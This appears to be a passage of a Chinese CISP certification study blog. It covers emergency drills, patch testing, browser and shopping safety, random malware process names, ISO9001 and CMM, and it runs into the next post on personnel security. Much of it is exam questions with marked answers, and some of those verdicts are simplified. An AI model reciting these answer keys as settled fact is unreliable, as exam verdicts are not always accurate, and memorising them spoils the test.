增强应急响应信心 ⏱️ 缩短响应时间 演练过的流程执行更快 减少决策犹豫时间 避免手忙脚乱 提高应急效率 🔍 发现潜在问题 识别资源不足 发现流程漏洞 暴露技术缺陷 完善应急准备 错误认知分析： 错误认知 实际情况 风险 技术人员优势足够 应急响应需要流程和协作，不只是技术 响应混乱 自己开发系统就了解 应急场景与日常运维不同 处置不当 演练影响业务 可以选择非高峰期或桌面演练 准备不足 有文档就够了 文档需要通过演练验证 计划失效 正确的应急预案工作： 应急预案完整工作流程： ├── 第一步：制定预案 │ ├── 应急响应流程 │ ├── 角色职责分工 │ ├── 资源准备清单 │ └── 联系人信息 ├── 第二步：培训宣贯 │ ├── 全员安全意识培训 │ ├── 应急团队专项培训 │ ├── 流程和工具培训 │ └── 案例学习分析 ├── 第三步：演练验证 │ ├── 桌面演练（讨论式） │ ├── 功能演练（测试特定功能） │ ├── 全面演练（完整流程） │ └── 实战演练（模拟真实场景） ├── 第四步：评估改进 │ ├── 演练效果评估 │ ├── 问题分析总结 │ ├── 预案优化调整 │ └── 持续改进机制 └── 第五步：定期回顾 ├── 至少每年一次 ├── 重大变更后 ├── 实际事件后 └── 更新预案文档 💡 其他总结的正确性正确的总结： ✅ 应急演练流程完善 包括事件通报、确定优先级、启动实施、后期运维、更新预案5个阶段 流程完善可用 符合应急响应标准流程 ✅ 应急预案分类全面 包括基本环境类、业务系统类、安全事件类和其他类 基本覆盖了各类应急事件类型 分类合理完整 ✅ 事件分类符合标准 依据GB/Z20986-2007《信息安全技术信息安全事件分类分级指南》 分为7个基本类别 预案符合国家相关标准 8.3 系统漏洞补丁管理 漏洞补丁的正确处理方式： 微软刚发布了数个系统漏洞补丁，作为单位安全主管，应该选择的最优先方案是： 答案：对于重要的服务，应在测试环境中安装并确认补丁兼容性问题后再在正式生产环境中部署 graph TB A[\"漏洞补丁发布\"] B[\"❌ 错误做法\"] C[\"✅ 正确做法\"] A --> B A --> C B --> B1[\"认为无利用工具不处理\"] B --> B2[\"立即在生产环境直接安装\"] B --> B3[\"仅服务器安装终端自行升级\"] C --> C1[\"评估漏洞影响\"] C --> C2[\"测试环境验证\"] C --> C3[\"确认兼容性\"] C --> C4[\"生产环境部署\"] style B fill:#ffcdd2,stroke:#b71c1c style C fill:#c8e6c9,stroke:#2e7d32 💡 补丁管理最佳实践为什么要先测试后部署： 🔬 兼容性验证 补丁可能与现有系统冲突 可能影响业务应用运行 可能导致系统不稳定 测试可以提前发现问题 ⚖️ 风险平衡 平衡安全风险和业务风险 避免补丁导致业务中断 确保系统稳定运行 制定回退方案 📋 规范流程 评估漏洞严重程度 在测试环境验证 制定部署计划 分阶段实施 监控部署效果 补丁管理流程： 补丁管理完整流程： ├── 第一步：漏洞评估 │ ├── 漏洞严重程度 │ ├── 影响范围分析 │ ├── 利用可能性 │ └── 业务影响评估 ├── 第二步：补丁获取 │ ├── 从官方渠道下载 │ ├── 验证补丁完整性 │ ├── 查看补丁说明 │ └── 了解已知问题 ├── 第三步：测试验证 │ ├── 在测试环境部署 │ ├── 功能测试 │ ├── 兼容性测试 │ ├── 性能测试 │ └── 记录测试结果 ├── 第四步：部署计划 │ ├── 确定部署时间窗口 │ ├── 制定部署顺序 │ ├── 准备回退方案 │ ├── 通知相关人员 │ └── 准备应急预案 ├── 第五步：生产部署 │ ├── 备份系统和数据 │ ├── 按计划部署补丁 │ ├── 验证部署成功 │ ├── 监控系统运行 │ └── 记录部署过程 └── 第六步：后续跟踪 ├── 持续监控系统 ├── 收集用户反馈 ├── 处理异常问题 └── 更新文档记录 错误做法分析： 错误做法 问题 风险 认为无利用工具不处理 利用工具可能很快出现 系统被攻击 立即在生产环境安装 未经测试可能导致故障 业务中断 仅服务器安装，终端自行升级 终端也可能是攻击入口 安全防护不全面 使用系统自动更新 无法控制更新时间和影响 意外中断 ⚠️ 补丁部署优先级不同系统的部署策略： 🔴 关键系统（高优先级） 必须在测试环境充分验证 选择业务低峰期部署 准备完善的回退方案 安排专人现场监控 🟡 重要系统（中优先级） 在测试环境验证 分批次部署 准备回退方案 🟢 一般系统（低优先级） 简单测试后部署 可以使用自动化工具 定期检查部署状态 补丁部署时间窗口： 漏洞严重程度 测试时间 部署时间窗口 说明 严重（CVSS 9-10） 1-3天 7天内 紧急部署 高（CVSS 7-8.9） 3-7天 30天内 优先部署 中（CVSS 4-6.9） 7-14天 60天内 计划部署 低（CVSS 0-3.9） 14-30天 90天内 常规部署 九、个人计算机安全实践 9.1 网上购物安全习惯 金女士经常通过计算机在互联网上购物，从安全角度看，需要养成良好的操作习惯。 安全操作习惯对比： graph TB A[\"网上购物安全实践\"] B[\"✅ 良好习惯\"] C[\"❌ 不良习惯\"] A --> B A --> C B --> B1[\"安装安全防护软件\"] B --> B2[\"设置安全ActiveX控件\"] B --> B3[\"不保留历史记录\"] C --> C1[\"不升级系统和软件\"] B1 --> B1A[\"病毒查杀\"] B1 --> B1B[\"安全检查\"] B1 --> B1C[\"安全加固\"] B2 --> B2A[\"只下载签名控件\"] B2 --> B2B[\"验证安全性\"] B3 --> B3A[\"保护隐私\"] B3 --> B3B[\"防止信息泄露\"] C1 --> C1A[\"存在安全漏洞\"] C1 --> C1B[\"易被攻击\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#ffcdd2,stroke:#b71c1c 🚨 不升级软件是不良习惯为什么选项A是不好的操作习惯： A. 使用专用上网购物用计算机，安装好软件后不要对该计算机上的系统软件、应用软件进行升级 ❌ 不升级的严重风险 系统和软件存在已知安全漏洞 攻击者可以利用这些漏洞入侵 无法获得最新的安全补丁 防护能力逐渐降低 🔒 正确做法 定期更新操作系统 及时安装安全补丁 更新应用软件到最新版本 启用自动更新功能 各选项分析： 选项 说明 安全性评价 A. 不升级系统和软件 ❌ 不良习惯 存在严重安全风险 B. 安装安全防护软件 ✅ 良好习惯 提供多层防护 C. 只下载签名的ActiveX控件 ✅ 良好习惯 防止恶意控件 D. 不保留历史记录和表单数据 ✅ 良好习惯 保护个人隐私 网上购物安全最佳实践： 网上购物安全清单： ├── 系统安全 │ ├── ✅ 定期更新操作系统 │ ├── ✅ 及时安装安全补丁 │ ├── ✅ 使用最新版本浏览器 │ └── ✅ 启用自动更新 ├── 防护软件 │ ├── ✅ 安装杀毒软件 │ ├── ✅ 启用防火墙 │ ├── ✅ 使用安全检查工具 │ └── ✅ 定期全盘扫描 ├── 浏览器安全 │ ├── ✅ 只下载签名的ActiveX控件 │ ├── ✅ 禁用不必要的插件 │ ├── ✅ 启用弹窗拦截 │ └── ✅ 使用HTTPS网站 ├── 隐私保护 │ ├── ✅ 不保留浏览历史 │ ├── ✅ 清除表单数据 │ ├── ✅ 使用隐私模式 │ └── ✅ 定期清理Cookie └── 支付安全 ├── ✅ 使用安全支付平台 ├── ✅ 启用双因素认证 ├── ✅ 不保存支付密码 └── ✅ 定期检查账单 💡 为什么其他选项是良好习惯B. 安装具有良好声誉的安全防护软件 病毒查杀：检测和清除恶意软件 安全检查：发现系统漏洞和风险 安全加固：提升系统安全性 C. 设置只能下载和安装经过签名的、安全的ActiveX控件 数字签名验证控件来源 防止恶意控件安装 减少浏览器漏洞利用 D. 设置不在计算机中保留网络历史记录和表单数据 防止个人信息泄露 保护浏览隐私 减少被他人窥探的风险 软件更新的重要性： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_b2edc7118')); var option = { \"title\": { \"text\": \"软件更新对安全性的影响\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"定期更新\", \"不更新\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"第1个月\", \"第3个月\", \"第6个月\", \"第12个月\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"安全风险等级\", \"max\": 100 }, \"series\": [ { \"name\": \"定期更新\", \"type\": \"line\", \"data\": [10, 15, 20, 25], \"itemStyle\": {\"color\": \"#4caf50\"} }, { \"name\": \"不更新\", \"type\": \"line\", \"data\": [10, 40, 70, 95], \"itemStyle\": {\"color\": \"#f44336\"} } ] }; chart.setOption(option); } })(); 十、企业网络安全防护措施 10.1 防病毒网页浏览安全 企业员工在浏览网页时总导致病毒感染系统，需要采取有效的安全措施。 安全措施评估： graph TB A[\"网页浏览安全措施\"] B[\"✅ 有效措施\"] C[\"❌ 不适合推广\"] A --> B A --> C B --> B1[\"防病毒网关\"] B --> B2[\"统一部署防病毒软件\"] B --> B3[\"安全培训\"] C --> C1[\"禁止使用IE强制使用Chrome\"] B1 --> B1A[\"网络层防护\"] B2 --> B2A[\"终端层防护\"] B3 --> B3A[\"人员层防护\"] C1 --> C1A[\"过于绝对\"] C1 --> C1B[\"兼容性问题\"] C1 --> C1C[\"业务影响\"] style B fill:#c8e6c9,stroke:#2e7d32 style C fill:#ffcdd2,stroke:#b71c1c 🚨 不适合推广的措施错误措施：制定制度禁止使用微软的IE浏览器上网，统一要求使用Chrome浏览器 ❌ 为什么不适合推广： 🌐 兼容性问题 许多企业内部系统依赖IE浏览器 政府、银行等网站可能只支持IE 某些ActiveX控件只能在IE中运行 强制切换可能导致业务中断 💼 业务影响 影响员工正常工作 可能需要大量系统改造 增加IT支持成本 用户体验下降 ⚖️ 过于绝对 浏览器本身不是安全问题的根源 应该是多层防护，而非单一限制 缺乏灵活性 治标不治本 🔧 实施困难 难以完全禁止 需要技术手段强制 可能引起员工抵触 管理成本高 各项措施分析： 措施 有效性 可行性 推广性 评价 A. 防病毒网关 ⭐⭐⭐⭐⭐ ⭐⭐⭐⭐ ⭐⭐⭐⭐⭐ ✅ 推荐 B. 统一部署防病毒软件 ⭐⭐⭐⭐⭐ ⭐⭐⭐⭐⭐ ⭐⭐⭐⭐⭐ ✅ 推荐 C. 禁止IE，强制Chrome ⭐⭐ ⭐⭐ ⭐ ❌ 不推荐 D. 安全培训 ⭐⭐⭐⭐ ⭐⭐⭐⭐⭐ ⭐⭐⭐⭐⭐ ✅ 推荐 💡 推荐的安全措施A. 采购防病毒网关并部署在企业互联网出口 ✅ 网络层统一防护 ✅ 实时检测和阻止网页病毒 ✅ 集中管理，易于维护 ✅ 对用户透明，不影响使用 B. 采购并统一部署企业防病毒软件 ✅ 终端层防护 ✅ 统一管理病毒库升级 ✅ 确保每台设备有效防护 ✅ 可以设置统一策略 D. 组织员工进行上网行为安全培训 ✅ 提高安全意识 ✅ 从源头减少风险 ✅ 培养良好习惯 ✅ 长期有效 正确的网页浏览安全策略： 多层防护策略： ├── 网络层 │ ├── 防病毒网关 │ ├── Web过滤 │ ├── IPS&#x2F;IDS │ └── 流量监控 ├── 终端层 │ ├── 防病毒软件 │ ├── 浏览器安全设置 │ ├── 补丁管理 │ └── 应用白名单 ├── 人员层 │ ├── 安全意识培训 │ ├── 安全操作规范 │ ├── 定期安全提醒 │ └── 模拟钓鱼演练 └── 管理层 ├── 安全策略制定 ├── 访问控制策略 ├── 审计和监控 └── 应急响应机制 浏览器安全最佳实践： 实践 说明 优先级 保持浏览器更新 及时安装安全补丁 ⭐⭐⭐⭐⭐ 使用安全插件 广告拦截、脚本控制 ⭐⭐⭐⭐ 禁用不必要的插件 减少攻击面 ⭐⭐⭐⭐ 启用安全警告 提示不安全网站 ⭐⭐⭐⭐⭐ 定期清理缓存 删除临时文件 ⭐⭐⭐ 使用HTTPS 加密通信 ⭐⭐⭐⭐⭐ 多浏览器策略 根据需要选择浏览器 ⭐⭐⭐⭐ 💡 灵活的浏览器管理策略推荐做法： 🌐 多浏览器并存 允许使用多种浏览器 根据业务需求选择 设置默认浏览器 提供使用指南 🔒 安全配置 统一安全设置 禁用危险功能 启用安全特性 定期检查配置 📚 用户教育 培训安全使用方法 识别钓鱼网站 安全下载文件 报告可疑活动 十一、恶意代码防护技术 11.1 随机进程名技术 恶意代码使用随机进程名是一种常见的隐蔽技术，用于逃避检测。 随机进程名技术原理： graph TB A[\"恶意代码启动\"] B[\"生成随机进程名\"] C[\"启动进程\"] D[\"隐藏真实程序\"] A --> B B --> C C --> D B --> B1[\"每次启动不同\"] B --> B2[\"模仿系统进程\"] B --> B3[\"随机字符组合\"] D --> D1[\"难以发现\"] D --> D2[\"难以定位文件\"] D --> D3[\"逃避检测\"] style A fill:#ffcdd2,stroke:#b71c1c style B fill:#fff3e0,stroke:#f57c00 style C fill:#ffccbc,stroke:#d84315 style D fill:#ffebee,stroke:#c62828 💡 随机进程名技术的正确理解正确答案：随机进程名技术每次启动时随机生成恶意代码进程名称，通过不固定的进程名称使自己不容易被发现真实的恶意代码程序名称 技术特点： 🎲 随机性 每次启动生成不同的进程名 无法通过固定进程名识别 增加检测难度 🎭 隐蔽性 模仿正常系统进程 混淆在大量进程中 不容易引起注意 🔍 逃避检测 传统黑名单无效 进程名不固定 难以建立特征库 错误理解分析： 选项 说明 为什么错误 A. 找到进程名就找到程序 ❌ 错误 进程名是随机的，找到进程名不等于找到真实程序文件 B. 杀毒软件按进程名查杀 ❌ 错误 现代杀毒软件不仅依赖进程名，还使用行为分析等多种技术 C. 进程管理器看不到进程 ❌ 错误 随机进程名不会让进程隐形，只是名称不固定 D. 随机生成进程名隐藏真实程序 ✅ 正确 通过不固定的进程名使真实程序不容易被发现 随机进程名示例： 正常系统进程： - svchost.exe - explorer.exe - lsass.exe 恶意代码随机进程名（每次启动不同）： 第1次启动：svch0st.exe（模仿svchost） 第2次启动：winl0g0n.exe（模仿winlogon） 第3次启动：sys32srv.exe（看起来像系统服务） 第4次启动：a7f3k2m9.exe（随机字符） 真实程序文件可能是： C:\\Windows\\Temp\\malware.exe 随机进程名技术的目的： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_368012b81')); var option = { \"title\": { \"text\": \"随机进程名技术的目的\" }, \"tooltip\": { \"trigger\": \"item\" }, \"series\": [{ \"type\": \"pie\", \"radius\": \"50%\", \"data\": [ {\"value\": 40, \"name\": \"逃避检测\", \"itemStyle\": {\"color\": \"#f44336\"}}, {\"value\": 30, \"name\": \"隐藏真实程序\", \"itemStyle\": {\"color\": \"#ff9800\"}}, {\"value\": 20, \"name\": \"混淆管理员\", \"itemStyle\": {\"color\": \"#ffc107\"}}, {\"value\": 10, \"name\": \"延长存活时间\", \"itemStyle\": {\"color\": \"#ffeb3b\"}} ], \"label\": { \"show\": true, \"formatter\": \"{b}: {d}%\" } }] }; chart.setOption(option); } })(); 防御随机进程名恶意代码： 防御策略： ├── 行为分析 │ ├── 监控进程行为 │ ├── 检测异常活动 │ ├── 分析网络连接 │ └── 监控文件操作 ├── 启发式检测 │ ├── 代码特征分析 │ ├── 内存扫描 │ ├── API调用监控 │ └── 沙箱分析 ├── 白名单机制 │ ├── 应用白名单 │ ├── 只允许已知程序 │ ├── 数字签名验证 │ └── 路径限制 └── 综合防护 ├── 多引擎扫描 ├── 云查杀 ├── 机器学习 └── 威胁情报 ⚠️ 检测要点如何发现随机进程名恶意代码： 🔍 异常行为 进程启动位置异常 网络连接可疑 文件操作异常 CPU/内存占用异常 📊 进程分析 检查进程路径 验证数字签名 查看父进程 分析命令行参数 🛡️ 防护措施 使用行为检测 启用应用白名单 定期全盘扫描 监控系统变化 现代杀毒软件的检测方法： 检测方法 说明 对随机进程名的有效性 特征码检测 基于病毒特征库 ⭐⭐ 低（进程名不固定） 行为检测 监控程序行为 ⭐⭐⭐⭐⭐ 高 启发式检测 分析代码特征 ⭐⭐⭐⭐ 高 沙箱分析 隔离环境运行 ⭐⭐⭐⭐⭐ 高 云查杀 云端威胁情报 ⭐⭐⭐⭐ 高 机器学习 AI识别恶意行为 ⭐⭐⭐⭐⭐ 高 💡 防护建议企业防护策略： 🛡️ 多层防护 不依赖单一检测方法 结合多种技术 网络+终端+行为 📊 持续监控 实时监控进程活动 分析异常行为 建立基线 🔄 定期更新 更新病毒库 更新检测规则 更新威胁情报 👥 用户教育 培训识别可疑进程 报告异常情况 不运行未知程序 十二、质量管理与能力成熟度 12.1 ISO9001过程方法 ISO9001-2000标准鼓励在制定、实施质量管理体系以及改进其有效性时采用过程方法，通过满足顾客要求，增进顾客满意度。 过程方法示意图的关键要素： graph LR A[\"顾客需求\"] --> B[\"输入\"] B --> C[\"活动\"] C --> D[\"输出\"] D --> E[\"顾客满意\"] F[\"管理者\"] --> C G[\"资源\"] --> C C --> C1[\"过程转换\"] style A fill:#e3f2fd,stroke:#1976d2 style C fill:#c8e6c9,stroke:#2e7d32 style E fill:#fff3e0,stroke:#f57c00 style F fill:#f3e5f5,stroke:#7b1fa2 💡 过程方法的核心是活动正确答案：D. 活动 过程方法的基本逻辑： 📥 输入（Input） 顾客需求和要求 原材料和信息 资源和条件 🔄 活动（Activity） 将输入转换为输出的过程 包括一系列相互关联的活动 需要资源和管理支持 这是过程的核心环节 📤 输出（Output） 产品或服务 满足顾客要求 实现顾客满意 为什么不是其他选项： 选项 说明 为什么不正确 A. 策略 策略是指导方针 不是过程转换的核心 B. 管理者 管理者提供支持 是支持要素，不是核心 C. 组织 组织是实施主体 不是过程本身 D. 活动 ✅ 正确答案 是将输入转换为输出的核心 过程方法的要素： ISO9001过程方法要素： ├── 输入 │ ├── 顾客需求 │ ├── 法规要求 │ ├── 原材料 │ └── 信息数据 ├── 活动（核心） │ ├── 策划活动 │ ├── 执行活动 │ ├── 检查活动 │ └── 改进活动 ├── 输出 │ ├── 产品 │ ├── 服务 │ ├── 文档 │ └── 顾客满意 ├── 支持要素 │ ├── 管理者承诺 │ ├── 人力资源 │ ├── 基础设施 │ └── 工作环境 └── 监控 ├── 过程监控 ├── 绩效测量 ├── 持续改进 └── 管理评审 10.2 能力成熟度模型（CMM） 能力成熟度模型（Capability Maturity Model）是评估软件开发组织能力的框架。 CMM的五个成熟度等级： graph TB A[\"CMM成熟度等级\"] B[\"Level 1初始级\"] C[\"Level 2可重复级\"] D[\"Level 3已定义级\"] E[\"Level 4已管理级\"] F[\"Level 5优化级\"] A --> B B --> C C --> D D --> E E --> F B --> B1[\"混乱无序\"] C --> C1[\"基本管理\"] D --> D1[\"标准化\"] E --> E1[\"量化管理\"] F --> F1[\"持续改进\"] style B fill:#ffcdd2,stroke:#b71c1c style C fill:#ffccbc,stroke:#d84315 style D fill:#fff3e0,stroke:#f57c00 style E fill:#c8e6c9,stroke:#2e7d32 style F fill:#e3f2fd,stroke:#1976d2 🚨 CMM的错误理解错误答案：A. CMM的基本思想是，因为问题是由技术落后引起的，所以新技术的运用会在一定程度上提高质量、生产率和利润率 为什么这是错误的： ❌ CMM不强调技术 CMM关注的是过程成熟度，而非技术先进性 强调管理和过程改进，而非技术更新 认为问题主要源于过程不成熟，而非技术落后 ✅ CMM的正确理解 关注软件开发过程的成熟度 通过过程改进提高质量 强调管理和组织能力 基于统计过程控制理论 CMM的正确理解： 选项 说明 正确性 A. 强调新技术运用 ❌ 错误 CMM关注过程，非技术 B. 思想来源于项目管理和质量管理 ✅ 正确 确实源于这两个领域 C. 衡量工程实施能力的方法 ✅ 正确 面向工程过程 D. 基于统计过程控制理论 ✅ 正确 理论基础正确 CMM的核心思想： CMM核心理念： ├── 过程成熟度 │ ├── 关注软件开发过程 │ ├── 而非技术先进性 │ ├── 通过过程改进提高质量 │ └── 建立可重复的过程 ├── 理论基础 │ ├── 统计过程控制（SPC） │ ├── 项目管理理论 │ ├── 质量管理理论 │ └── 组织行为学 ├── 基本假设 │ ├── 过程质量决定产品质量 │ ├── 成熟的过程产出高质量产品 │ ├── 可以低成本生产高质量产品 │ └── 持续改进是关键 └── 改进路径 ├── 评估当前成熟度 ├── 识别改进机会 ├── 制定改进计划 ├── 实施过程改进 └── 验证改进效果 CMM与技术的关系： graph TB A[\"软件质量提升\"] B[\"❌ 错误观念依赖新技术\"] C[\"✅ CMM理念依赖过程成熟度\"] A --> B A --> C B --> B1[\"追求新技术\"] B --> B2[\"频繁技术更新\"] B --> B3[\"忽视过程管理\"] C --> C1[\"建立标准过程\"] C --> C2[\"持续过程改进\"] C --> C3[\"量化管理\"] style B fill:#ffcdd2,stroke:#b71c1c style C fill:#c8e6c9,stroke:#2e7d32 💡 CMM的价值CMM带来的好处： 📈 提高可预测性 建立可重复的过程 项目结果更可预测 降低项目风险 💰 降低成本 减少返工和缺陷 提高生产效率 优化资源利用 ✅ 提升质量 系统化的质量保证 持续的过程改进 更高的客户满意度 🎯 增强竞争力 提升组织能力 获得客户信任 市场竞争优势 总结 通信与操作安全的核心在于： 威胁识别：内部恶意政击是最大威胁 介质安全：物理破坏是最有效的销毁方法 可用性保障：链路冗余最能提高网络可用性 网络协议：SSL/TLS属于传输层，WPA2基于802.11i正式标准 身份认证：虹膜识别提供最高安全性 网络架构：星型拓扑提供良好的故障隔离 人员技能：沟通技能是安全工作的基础 应用安全：最小化错误信息反馈 应急准备：必须进行应急演练验证 补丁管理：测试后再部署到生产环境 个人安全：必须定期升级系统和软件 浏览器安全：不应强制禁止某种浏览器，应采用多层防护 恶意代码：随机进程名技术通过不固定进程名隐藏真实程序 质量管理：ISO9001过程方法核心是活动 能力成熟度：CMM关注过程成熟度，非技术先进性 🎯 关键要点 信息安全管理最关注内部恶意攻击 物理破坏是磁介质最有效的销毁方法 链路冗余能最有效提高网络可用性 SSL/TLS属于传输层，为TCP连接提供加密和认证 WPA依照802.11i草案，WPA2依照802.11i正式标准 虹膜识别技术安全性最高，适合替代PIN码 星型拓扑单点故障只影响对应终端 沟通技能是信息安全部门最需要的技能 错误信息处理应最小化反馈信息，避免泄露系统细节 应急演练是必须的，不能因为技术优势或业务影响而省略 补丁部署前必须在测试环境验证兼容性 网上购物必须定期升级系统和软件，不升级是不良习惯 禁止使用IE强制使用Chrome不适合推广，应采用多层防护策略 随机进程名技术每次启动生成不同进程名，隐藏真实程序 现代杀毒软件不仅依赖进程名，还使用行为分析等多种技术 ISO9001过程方法的核心是活动（将输入转换为输出） CMM关注过程成熟度，而非技术先进性，基于统计过程控制理论","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：人员安全管理","slug":"2025/10/CISP-Personnel-Security-Management-zh-CN","date":"un11fin11","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Personnel-Security-Management/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Personnel-Security-Management/","excerpt":"深入解析CISP认证中的人员安全管理知识点，涵盖人员生命周期管理、离职控制和补偿性控制措施。","text":"人员安全管理是信息安全管理中最难也是最重要的环节，人既是安全的最后一道防线，也是最大的安全隐患。 一、人员安全管理的重要性 graph LR A[\"人员安全管理\"] --> B[\"最难的环节\"] A --> C[\"最重要的环节\"] A --> D[\"最容易被忽视的环节\"] B --> E[\"人的行为难以预测\"] B --> F[\"人的动机复杂多变\"] C --> G[\"人是安全的最后一道防线\"] C --> H[\"人也是最大的安全隐患\"] D --> I[\"技术措施更直观\"] D --> J[\"人员管理需要持续投入\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#ffebee,stroke:#c62828 style C fill:#e8f5e9,stroke:#2e7d32 style D fill:#fff3e0,stroke:#f57c00 二、人员安全管理的关键环节 完整的人员安全管理生命周期： graph LR A[\"招聘前\"] --> B[\"入职时\"] B --> C[\"在职期间\"] C --> D[\"离职时\"] D --> E[\"离职后\"] A --> A1[\"背景调查\"] B --> B1[\"安全培训签署协议\"] C --> C1[\"持续培训权限审查\"] D --> D1[\"权限回收资产归还\"] E --> E1[\"保密义务竞业限制\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#f3e5f5,stroke:#7b1fa2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#fce4ec,stroke:#c2185b 关键控制措施： 阶段 控制措施 目的 招聘前 背景调查（重要/敏感岗位） 识别潜在风险 入职时 签署保密协议、安全培训 建立安全意识 在职期间 定期培训、权限审查 维持安全水平 离职时 清除所有逻辑访问账号 防止未授权访问 离职后 保密义务持续有效 保护敏感信息 2.1 招聘前：背景调查 关键岗位识别： 需要进行背景调查的关键岗位包括： 💰 财务总监、财务经理等财务关键岗位 🔐 信息安全管理人员 👨‍💻 系统管理员、数据库管理员 🔑 拥有特权访问权限的岗位 📊 接触敏感数据的岗位 背景调查内容： 📋 教育背景验证 💼 工作经历核实 🔍 犯罪记录查询 📞 推荐人访谈 💳 信用记录检查（特定岗位） 背景调查结果处理： ✅ 通过调查：继续招聘流程 ❌ 发现问题：停止招聘流程，取消应聘人员资格 ⚠️ 需要澄清：与应聘人员沟通，必要时进行补充调查 ⚠️ 背景调查原则如果应聘者在背景调查中不符合企业要求，应立即停止招聘流程，取消应聘人员资格。不应因为其他因素而降低标准。 2.2 入职时：建立安全意识 职责定义的关键因素： 在进行人员的职责定义时，信息安全方面应重点考虑： 🎯 人员需要履行的信息安全职责 在岗位职责描述或任用条款中明确说明 包括日常安全操作要求 明确安全事件响应职责 规定保密义务和范围 必须完成的工作： ✅ 签署劳动合同及保密协议 ✅ 进行信息安全意识培训 ✅ 明确岗位安全职责 ✅ 分配工作需要的最低权限 ✅ 建立个人安全档案 ⚠️ 入职权限分配原则正确做法： 分配工作需要的最低权限 根据岗位职责授予必要访问权限 遵循最小权限原则 错误做法： ❌ 允许访问企业所有的信息资产 ❌ 授予超出工作需要的权限 ❌ 未经审批直接开放全部权限 2.3 在职期间：持续管理 定期工作： 🎓 定期安全培训和考核 🔐 定期权限审查和调整 📊 安全意识评估 🔄 岗位变动时的权限更新 📝 安全事件记录和处理 高风险人员识别： 在单位中，以下人员的安全风险需要特别关注： graph LR A[\"人员安全风险等级\"] B[\"低风险\"] C[\"中风险\"] D[\"高风险\"] E[\"极高风险\"] A --> B A --> C A --> D A --> E B --> B1[\"临时员工\"] B --> B2[\"外部咨询人员\"] C --> C1[\"普通在职员工\"] D --> D1[\"离职员工\"] E --> E1[\"对公司不满的员工\"] E --> E2[\"即将离职的不满员工\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#4caf50,stroke:#2e7d32 style C fill:#8bc34a,stroke:#558b2f style D fill:#ff9800,stroke:#e65100 style E fill:#f44336,stroke:#c62828 🚨 最高风险：对公司不满的员工为什么风险最大： 拥有合法的系统访问权限 了解公司内部运作和安全措施 有明确的动机进行恶意行为 可能在离职前采取报复行动 难以提前识别和防范 应对措施： 建立员工满意度监测机制 及时处理员工投诉和不满 对异常行为进行监控 关键岗位人员离职时立即回收权限 加强离职过程管理 2.4 离职时：关键控制点 ⚠️ 离职管理的关键要求必须执行的操作： 🔒 清除所有逻辑访问账号 🔑 回收所有物理访问凭证 💾 归还所有公司资产 📝 签署离职保密承诺 🔍 进行离职面谈 💡 最佳离职管理流程保护企业知识产权和资产的最佳方法： 1️⃣ 进行离职谈话 了解离职原因 强调保密义务 明确离职后的责任 2️⃣ 签署保密协议 明确保密范围 规定违约责任 法律约束力 3️⃣ 禁止员工账号 立即禁用所有系统账号 包括邮箱、VPN、应用系统 防止未授权访问 4️⃣ 更改密码 更改共享账号密码 更改系统管理员密码 更改敏感系统密码 ⚠️ 不充分的做法： ❌ 仅进行离职谈话，不签署保密协议 ❌ 仅签署协议，不禁止账号 ❌ 仅禁止账号，不更改密码 离职流程： 离职申请 ↓ 权限清单确认 ↓ 逐项回收和清除 ├── 系统账号 ├── 门禁卡 ├── 电脑设备 ├── 移动设备 └── 其他资产 ↓ 签署离职文件 ↓ 离职面谈 ↓ 完成离职 2.5 离职后：持续义务 保密义务： 📜 保密协议持续有效 🚫 竞业限制条款（如适用） ⚖️ 违约责任明确 📞 保持联系方式更新 三、职责分离难以实施时的应对 💡 补偿性控制当职责分离难以实施时，企业不是无能为力，而应该考虑实施补偿性的控制措施。 补偿性控制措施示例： 场景：小型企业中，同一人员需要兼任开发和维护职责 补偿措施： ├── 加强审计：所有操作必须记录日志 ├── 双人复核：关键操作需要第二人审批 ├── 定期审查：定期检查操作日志和变更记录 ├── 技术控制：使用自动化工具限制权限范围 └── 外部审计：定期进行独立的安全审计 补偿控制的原则： 识别风险：明确职责未分离带来的具体风险 评估影响：评估风险可能造成的影响程度 设计控制：设计针对性的补偿控制措施 实施监控：持续监控补偿措施的有效性 定期评估：定期评估是否可以实现真正的职责分离 常见补偿控制措施： 风险场景 补偿控制措施 开发人员维护生产系统 所有变更需要审批；详细日志记录；定期审计 一人负责财务全流程 关键操作双人复核；银行对账；外部审计 系统管理员权限过大 特权账号管理；操作录屏；实时监控告警 小团队职责重叠 轮岗制度；交叉审查；外部独立审计 四、信息安全培训体系 4.1 培训体系概述 信息安全培训是人员安全管理的重要组成部分，应该建立分层次、全覆盖的培训体系。 graph TB A[\"信息安全培训体系\"] B[\"高层管理者培训\"] C[\"安全管理人员培训\"] D[\"技术人员培训\"] E[\"全员培训\"] A --> B A --> C A --> D A --> E B --> B1[\"网络安全法\"] B --> B2[\"战略与合规\"] B --> B3[\"管理责任\"] C --> C1[\"CISP认证\"] C --> C2[\"专业技能\"] C --> C3[\"管理能力\"] D --> D1[\"安全基础\"] D --> D2[\"安全开发\"] D --> D3[\"安全运维\"] E --> E1[\"安全意识\"] E --> E2[\"基础知识\"] E --> E3[\"日常规范\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#f3e5f5,stroke:#7b1fa2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#fce4ec,stroke:#c2185b 4.2 分层培训计划 完整的培训体系应包含四个层次： 培训对象 培训内容 培训目标 培训方式 频率 高层管理者（一把手） 网络安全法、战略规划、管理责任 提升安全意识，明确法律责任 专题讲座、高管研讨 年度 安全管理人员 CISP认证、专业技能、管理能力 确保专业能力达标 专业培训、认证考试 持续 技术人员 